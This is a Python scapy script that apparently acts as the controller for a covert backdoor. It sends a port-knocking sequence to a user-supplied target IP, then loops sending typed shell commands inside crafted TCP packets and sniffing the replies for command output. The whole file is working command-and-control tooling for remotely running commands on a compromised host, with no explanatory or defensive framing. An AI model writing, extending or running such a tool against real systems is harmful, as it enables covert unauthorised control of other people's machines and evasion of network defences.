#!/usr/bin/python

import time, os, sys, logging
import config
from scapy.all import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

results = ""
targetIP = ""

def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def portKnocking():
    global targetIP
    ports = config.portKnocks
    for port in ports:
        packet = IP(dst=targetIP)/UDP(sport=port, dport=config.listenPort)
        send(packet)
        time.sleep(config.delay)

def sendCommand(cmd):
    packet = IP(dst=targetIP)/TCP(sport=config.localPort, dport=config.remotePort)/Raw(load=cmd.encode("utf8"))
    send(packet)

def recvCommand(packet):
    global targetIP
    if packet.haslayer(IP):
        if packet[IP].src == targetIP:
            #data = parsePacket(packet)
            if packet.haslayer(Raw):
                cmd = packet[Raw].load
                print("Result: %s " % cmd)

def main():
    global targetIP
    checkRootPrivilege()
    targetIP = str(input("Enter target IP: "))

    portKnocking()
    while True:
        cmd = input("Enter command: ")
        sendCommand(cmd)
        sniff(filter="dst port " + str(config.localPort) + " and src port " + str(config.remotePort), prn=recvCommand)


if __name__ == '__main__':
    main()
